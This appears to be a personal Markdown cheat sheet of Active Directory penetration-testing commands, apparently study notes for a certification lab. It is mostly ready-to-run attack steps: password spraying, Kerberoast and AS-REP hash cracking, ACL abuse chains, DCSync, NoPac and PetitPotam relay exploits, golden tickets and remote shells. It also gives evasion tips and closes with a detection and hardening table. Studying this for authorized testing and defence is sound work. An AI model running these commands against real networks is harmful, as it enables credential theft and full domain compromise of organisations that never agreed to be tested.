---
tags: [pentest, active-directory, cheatsheet, htb-cpts]
---

# 🗺️ Active Directory Enumeration & Attack Map

> A phase-by-phase working map. Follow top to bottom on an engagement; jump around once you have a foothold. Commands assume Linux attack host unless a `[WIN]` tag is shown.

## 🧭 Methodology Checklist

- [ ] External recon (OSINT, DNS, ASN)
- [ ] Host/service discovery
- [ ] Unauthenticated user enumeration
- [ ] Password policy enumeration
- [ ] Password spraying → foothold creds
- [ ] Credentialed enumeration (users, groups, shares, ACLs)
- [ ] BloodHound ingestion + path analysis
- [ ] Kerberoasting / ASREPRoasting
- [ ] ACL abuse chain
- [ ] Local admin → lateral movement
- [ ] DCSync / domain compromise
- [ ] Trust enumeration + abuse (if multi-domain)
- [ ] Cleanup

---

## 1. External Recon (Pre-Engagement)

| Goal | Tool / Site |
|---|---|
| Address space / ASN | [BGP Toolkit (Hurricane Electric)](http://he.net/) |
| DNS validation | [domaintools](https://whois.domaintools.com/), [viewdns.info](https://viewdns.info/) |
| Leaked creds in public repos | [Trufflehog](https://github.com/trufflesecurity/truffleHog), [Grayhat Warfare](https://buckets.grayhatwarfare.com/) |
| Email harvesting | Google dorks: `filetype:pdf inurl:target.com`, `intext:"@target.com" inurl:target.com` |
| Username generation | [linkedin2username](https://github.com/initstring/linkedin2username) |
| Breach data / creds | [Dehashed](http://dehashed.com/) |

---

## 2. Host & Service Discovery

**Passive listening:**
```bash
sudo -E wireshark
sudo tcpdump -i ens224
sudo responder -I ens224 -A          # analysis mode, no poisoning
```

**Active sweep:**
```bash
fping -asgq 172.16.5.0/23            # -a alive, -s stats, -g CIDR gen, -q quiet
sudo nmap -v -A -iL hosts.txt -oA host-enum
```

`[WIN]` no-GUI capture: `pktmon.exe`

---

## 3. Unauthenticated User Enumeration

**Kerbrute (stealthy — no 4625, generates 4768 only if Kerberos logging enabled):**
```bash
git clone https://github.com/ropnop/kerbrute.git && sudo make all
kerbrute userenum -d DOMAIN.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
Wordlists: [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) (`jsmith.txt`, `jsmith2.txt`)

**SMB NULL session:**
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5
  rpcclient $> enumdomusers
crackmapexec smb 172.16.5.5 --users
```
`[WIN]` `net use \\DC01\ipc$ "" /u:""`

**LDAP anonymous bind:**
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

---

## 4. Password Policy Enumeration

**Unauthenticated (NULL/anon):**
```bash
rpcclient -U "" -N 172.16.5.5
  rpcclient $> querydominfo
enum4linux -p 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA out
ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m1 -B10 PWDHistoryLength
```

**Credentialed:**
```bash
crackmapexec smb 172.16.5.5 -u user -p pass --pass-pol
```

---

## 5. Password Spraying

⚠️ Careless spraying can lock out production accounts — always check policy first.

**Linux — rpcclient one-liner:**
```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**Kerbrute:**
```bash
kerbrute passwordspray -d domain.local --dc 172.16.5.5 valid_users.txt Welcome1
```

**CrackMapExec:**
```bash
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

**Local admin reuse across hosts** (pass-the-hash, target high-value hosts: SQL, Exchange):
```bash
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NTHASH> | grep +
```

`[WIN]` domain-joined foothold — auto-generates user list + policy-aware:
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

> 🔎 **Detection:** 4625 (SMB spray) / 4771 (Kerberos pre-auth failed, LDAP spray)

---

## 6. Credentialed Enumeration — Linux

| Tool | Use |
|---|---|
| **CrackMapExec/NetExec** | `--users` `--groups` `--loggedon-users` `--shares` `-M spider_plus` |
| **SMBMap** | `smbmap -u USER -p PASS -d DOMAIN -H DC_IP` — share perms/content |
| **rpcclient** | `queryuser 0xRID`, `enumdomusers` |
| **Impacket psexec.py / wmiexec.py** | remote shell (wmiexec = fewer logs, no dropped files) |
| **Windapsearch** | `--da` (Domain Admins), `-PU` (recursive privileged users) |
| **BloodHound.py** | `bloodhound-python -u USER -p PASS -ns DC_IP -d DOMAIN -c all` |

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p klmcargo2 --groups
sudo crackmapexec smb 172.16.5.5 -u forend -p klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p klmcargo2 -M spider_plus --share 'Department Shares'
```

**BloodHound GUI setup:** `sudo neo4j start` → `bloodhound` (default creds `neo4j` / `HTB_@cademy_stdnt!`) → zip + upload JSON → Analysis tab → `Find Shortest Paths To Domain Admins`.

---

## 7. Credentialed Enumeration — Windows `[WIN]`

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroupMember -Identity "Backup Operators"
```

**PowerView:**
```powershell
Import-Module .\powerview.ps1
Get-DomainUser -Identity mmorgan -Domain domain.local | select name,memberof,pwdlastset,admincount,serviceprincipalname
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName HOST
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```
**SharpView** — compiled PowerView equivalent when PowerShell is restricted.

**Snaffler** (creds/sensitive data on shares):
```powershell
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

**SharpHound:**
```powershell
.\SharpHound.exe -c All --zipfilename OUTPUT
```

**Security control checks:**
```powershell
Get-MpComputerStatus                 # Defender status
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Find-LAPSDelegatedGroups; Find-AdmPwdExtendedRights; Get-LAPSComputers
```
> AppLocker bypass note: PowerShell may be blocked only at `%SystemRoot%\system32\...\powershell.exe` — check [alternate exe locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations).

---

## 8. Living Off the Land — Quick Recon `[WIN]`

```
hostname / whoami /priv / systeminfo
[System.Environment]::OSVersion.Version
echo %USERDOMAIN%  /  echo %logonserver%
netsh advfirewall show allprofiles
sc query windefend
qwinsta          # who's logged on
```

**Useful `net` commands:** `net accounts /domain` (policy) · `net group "Domain Admins" /domain` · `net localgroup administrators /domain` · `net view /domain`
> Evasion trick: `net1` instead of `net` avoids the literal "net" string trigger.

**Dsquery:**
```
dsquery user / dsquery computer
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
> LDAP OID bitmask filtering — `userAccountControl:1.2.840.113556.1.4.803:=<value>` (e.g. `8192` = password not required flag family). See UAC flag table before relying on values.

---

## 9. Kerberoasting

Requires: cleartext/NTLM of a domain user, OR a domain-user shell, OR SYSTEM on domain-joined host.

**Linux — Impacket:**
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend -request
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
hashcat -m 13100 sqldev_tgs rockyou.txt
```

**Windows — Rubeus:**
```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:testspn /nowrap        # RC4
hashcat -m 13100 rc4_hash rockyou.txt
hashcat -m 19700 aes_hash rockyou.txt                # AES (msDS-SupportedEncryptionTypes = 24)
```

**Semi-manual (PowerShell + Mimikatz):**
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/here"
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
Convert `.kirbi` → hashcat: `kirbi2john.py` then `sed` regex from module notes.

> 🔎 **Mitigation:** gMSA/MSA accounts, strong service-account passwords, AES-only encryption. **Detection:** high volume of 4769/4770 for one account.

---

## 10. ASREPRoasting

Targets accounts with `DONT_REQ_PREAUTH` (no SPN needed).
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
```bash
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
hashcat -m 18200 asrep_hash rockyou.txt
```
> Can be forced onto an account you have `GenericWrite`/`GenericAll` over (set the UAC flag, roast, then unset).

---

## 11. ACL Abuse

**Enumerate rights:**
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
Reverse GUID→right lookup:
```powershell
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | ?{$_.rightsGuid -eq $guid} | fl
```

**Bulk sweep across all users:**
```powershell
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {
  get-acl "AD:\$(Get-ADUser $line)" | Select Path -ExpandProperty Access |
  Where-Object {$_.IdentityReference -match 'DOMAIN\\wley'}
}
```

**Common abusable rights → action:**

| Right | Abuse |
|---|---|
| `GenericAll` / `GenericWrite` on user | Force-change password, targeted Kerberoast (fake SPN) |
| `GenericWrite` on group | Add self (or any user) to group |
| `WriteDacl` | Grant yourself further rights, e.g. DCSync |
| `DS-Replication-Get-Changes[-All]` | DCSync |

**Example chain (wley → damundsen → Help Desk group → IT group → adunn):**
```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $pw -Credential $Cred -verbose
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -verbose
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
**Cleanup order matters:** remove fake SPN → remove group membership → restore/alert on password change.

> 🔎 **Detection:** Event 5136 (directory service object modified) — enable Advanced Security Audit Policy.

---

## 12. DCSync

Requires `Replicating Directory Changes` + `Replicating Directory Changes All` (default: Domain/Enterprise Admins).

```bash
secretsdump.py -outputfile hashes -just-dc DOMAIN/adunn@172.16.5.5
# flags: -just-dc-ntlm | -just-dc-user USER | -pwd-last-set | -history | -user-status
```
```powershell
runas /netonly /user:DOMAIN\adunn powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator
```

---

## 13. Local Admin → Lateral Movement

**RDP / RM group check:**
```powershell
Get-NetLocalGroupMember -ComputerName HOST -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName HOST -GroupName "Remote Management Users"
```
BloodHound Cypher (users who CanPSRemote):
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**WinRM:**
```bash
evil-winrm -i 10.129.201.234 -u forend
```
```powershell
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\forend",(ConvertTo-SecureString "pass" -AsPlainText -Force))
Enter-PSSession -ComputerName HOST -Credential $cred
```

**MSSQL (PowerUpSQL / Impacket):**
```powershell
Get-SQLInstanceDomain
Get-SQLQuery -Instance "172.16.5.150,1433" -username "domain\damundsen" -password "pass" -query 'Select @@version'
```
```bash
mssqlclient.py DOMAIN/DAMUNDSEN@172.16.5.150 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv     # check SeImpersonatePrivilege → JuicyPotato/PrintSpoofer/RoguePotato
```

---

## 14. Kerberos "Double Hop" Problem

Occurs when hopping Attack→HostA→HostB via WinRM (2nd hop has no cached TGT).

**Workaround 1 — PSCredential re-pass:**
```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\backupadm', $SecPassword)
Get-DomainUser -spn -Credential $Cred
```

**Workaround 2 — Register session config, run-as:**
```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential domain\backupadm
Restart-Service WinRM
Enter-PSSession -ComputerName HOST -Credential DOMAIN\backupadm -ConfigurationName backupadmsess
```

---

## 15. Bleeding-Edge / Named Vulnerabilities

| Vuln | CVE | Impact | Tool |
|---|---|---|---|
| **NoPac / SamAccountName Spoofing** | CVE-2021-42278/42287 | standard user → Domain Admin in one command | `scanner.py` → `noPac.py --impersonate administrator` |
| **PrintNightmare** | CVE-2021-34527 / 2021-1675 | SYSTEM shell on DC | `rpcdump.py` (check MS-RPRN/MS-PAR) + `CVE-2021-1675.py` |
| **PetitPotam (MS-EFSRPC)** | CVE-2021-36942 | Coerce DC auth → relay to AD CS → domain compromise | `PetitPotam.py` + `ntlmrelayx.py --adcs --template DomainController` |
| **MS14-068** | — | Forged PAC → fake Domain Admin | PyKEK / Impacket |

**NoPac:**
```bash
sudo python3 scanner.py DOMAIN.LOCAL/forend:pass -dc-ip 172.16.5.5 -use-ldap
sudo python3 noPac.py DOMAIN.LOCAL/forend:pass -dc-ip 172.16.5.5 -dc-host DC01 -shell --impersonate administrator -use-ldap
sudo python3 noPac.py DOMAIN.LOCAL/forend:pass -dc-ip 172.16.5.5 -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator
```

**PetitPotam → AD CS → DCSync:**
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://CA-HOST/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <attack-ip> <dc-ip>
python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\$ -pfx-base64 <cert> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user DOMAIN/administrator -k -no-pass DC01.DOMAIN.LOCAL
```

---

## 16. Miscellaneous Misconfigurations

| Finding | How to check | Notes |
|---|---|---|
| **Password in Description** | `Get-DomainUser * \| select samaccountname,description \| ?{$_.Description}` | common admin sloppiness |
| **PASSWD_NOTREQD** | `Get-DomainUser -UACFilter PASSWD_NOTREQD` | may allow blank passwords |
| **SYSVOL scripts** | `ls \\dc\SYSVOL\DOMAIN\scripts` | grep for hardcoded creds |
| **GPP cpassword** | `crackmapexec smb -L \| grep gpp` / `-M gpp_autologin` | AES key is public (MS14-025); old XMLs still present |
| **Exchange groups** | `Organization Management` = Exchange "Domain Admins" | often leads to full DA |
| **PrivExchange** | PushSubscription forces Exchange to auth to attacker | relay attack |
| **Printer Bug** | `Get-SpoolStatus -ComputerName DC` | coerce auth via spooler |
| **DNS record hunting** | `adidnsdump -u domain\\user ldap://DC_IP [-r]` | uncover non-obvious hostnames (e.g. JENKINS) |

```bash
gpp-decrypt <cpassword-blob>
```

---

## 17. GPO Abuse

```powershell
Get-DomainGPO | select displayname
Get-GPO -All | select DisplayName
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
Audit tools: **group3r**, **ADRecon**, **PingCastle**.

---

## 18. Domain Trusts

**Enumerate:**
```powershell
Get-ADTrust -Filter *
Get-DomainTrust
Get-DomainTrustMapping
```
```
netdom query /domain:domain.local trust
netdom query /domain:domain.local dc
```

### Child → Parent (SID History / ExtraSids)
Needs: KRBTGT hash of child, child domain SID, target username (can be fake), child FQDN, Enterprise Admins SID of root.

```powershell
mimikatz # lsadump::dcsync /user:CHILD\krbtgt
Get-DomainSID
Get-DomainGroup -Domain ROOT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
mimikatz # kerberos::golden /user:hacker /domain:CHILD.LOCAL /sid:<child-sid> /krbtgt:<hash> /sids:<EA-sid> /ptt
```
Rubeus equivalent: `.\Rubeus.exe golden /rc4:<hash> /domain:CHILD.LOCAL /sid:<child-sid> /sids:<EA-sid> /user:hacker /ptt`

**From Linux:**
```bash
secretsdump.py child.domain.local/user_adm@172.16.5.240 -just-dc-user CHILD/krbtgt
lookupsid.py child.domain.local/user_adm@172.16.5.240 | grep "Domain SID"
ticketer.py -nthash <krbtgt-hash> -domain CHILD.LOCAL -domain-sid <child-sid> -extra-sid <EA-sid> hacker
export KRB5CCNAME=hacker.ccache
psexec.py CHILD.LOCAL/hacker@dc.domain.local -k -no-pass -target-ip 172.16.5.5
```
Automated: `raiseChild.py -target-exec <dc-ip> CHILD.LOCAL/user_adm`

### Cross-Forest
```powershell
Get-DomainUser -SPN -Domain FOREIGN.LOCAL | select SamAccountName     # cross-forest kerberoast
.\Rubeus.exe kerberoast /domain:FOREIGN.LOCAL /user:svc /nowrap
Get-DomainForeignGroupMember -Domain FOREIGN.LOCAL                    # admin password reuse / foreign membership
```
```bash
GetUserSPNs.py -target-domain FOREIGN.LOCAL DOMAIN.LOCAL/wley -request
```
BloodHound-python across domains: point `/etc/resolv.conf` at each domain's DC in turn, run `bloodhound-python -d <domain> -dc <dc-host> -c All -u user -p pass`, merge zips, check **"Users with Foreign Domain Group Membership"**.

---

## 19. Hardening / Blue-Team Reference

| TTP | MITRE | Key Mitigation |
|---|---|---|
| External Recon | T1589 | Scrub docs/metadata, limit public job-posting detail |
| Internal Recon | T1595 | NIDS, firewall, disable ICMP responses |
| LLMNR/NBT-NS Poisoning | T1557.001 | Disable LLMNR + NBT-NS, enable SMB signing |
| Password Spraying | T1110.003 | Lockout policy, MFA, monitor 4624/4648 |
| Credentialed Enum | TA0006 | Network segmentation, anomaly detection |
| Kerberoasting | T1558.003 | gMSA/MSA, AES-only, strong SPN account passwords, audit 4769 volume |

**Quick hardening wins:**
- Disable LLMNR/NBT-NS (`HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast = 0`)
- Enable SMB signing + LDAP signing
- `ms-DS-MachineAccountQuota = 0` (blocks NoPac/RBCD via machine account creation)
- Disable print spooler where not needed
- Protected Users group for admin accounts (no NTLM/RC4/DES, no cacheable creds, 4-hr TGT cap)
- LAPS + disable RID-500 local admin
- Tiered administration; minimize Domain/Enterprise Admins membership
- Restrict null session access: `RestrictNullSessAccess = 1`
- Periodic BloodHound / PingCastle / Grouper audits

---

## 🔗 Related Notes
- [[cpts-cert]] — HTB CPTS certification path
- [[mini-soc-lab]] — detection-side practice for these TTPs (Wazuh + Suricata)
